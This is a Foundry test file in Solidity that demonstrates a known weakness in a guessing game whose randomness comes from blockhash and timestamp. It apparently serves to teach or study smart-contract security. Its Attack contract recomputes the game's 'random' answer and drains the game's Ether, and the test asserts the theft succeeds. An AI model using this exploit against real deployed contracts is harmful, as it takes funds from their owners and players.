// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {GuessTheRandomNumber} from "../src/GuessTheRandomNumber.sol";
// import {Attack} from "../src/AttackGame.sol";

/// @author @0xvishh
/// @title Attack Contract for GuessTheRandomNumber Vulnerable Game
/// @notice Predicts and submits the "random" answer to win Ether from the vulnerable contract

// Interface for interaction with the vulnerable contract
interface IGuessTheRandomNumber {
    function guess(uint256 _guess) external;
}

contract Attack {
    // Allow contract to receive Ether in case it wins
    receive() external payable {}

    /// @notice Executes the attack by predicting the answer and submitting it to the game
    /// @param game Address of the deployed GuessTheRandomNumber contract
    function attack(IGuessTheRandomNumber game) public {
        // Predict the answer using the same logic as the vulnerable contract
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        // Submit the winning guess
        game.guess(answer);
    }

    /// @notice View this contract's balance to check winnings
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract testAttackGuessTheNumber is Test {
    GuessTheRandomNumber game;
    Attack attacker;

    address alice = address(1); // deployer of the game
    address eve = address(2); // attacker

    function setUp() public {
        vm.deal(alice, 2 ether); //give deployer some ETH
        vm.deal(eve, 1 ether); //also give attacker some ETH
        //alice deploys the vulnerable game contract with 1 ether
        vm.prank(alice);
        game = new GuessTheRandomNumber{value: 1 ether}();
        // eve deploys attacker contract
        vm.prank(eve);
        attacker = new Attack();
        vm.prank(eve);
        (bool success,) = address(attacker).call{value: 1 ether}("");
        require(success, "funding attacker failed");
    }

    function testAttack() public {
        //simulate a new block so blockhash is accessible
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        //attacker calls Attack Function with the vulnerable game address
        vm.prank(eve); // call made from eve
        attacker.attack(IGuessTheRandomNumber(address(game)));

        // ✅ Assertion 1: Game contract should now have 0 balance
        assertEq(address(game).balance, 0);
        // ✅ Assertion 2: Attacker contract should now have 1 ether
        assertEq(address(attacker).balance, 2 ether);
    }
}
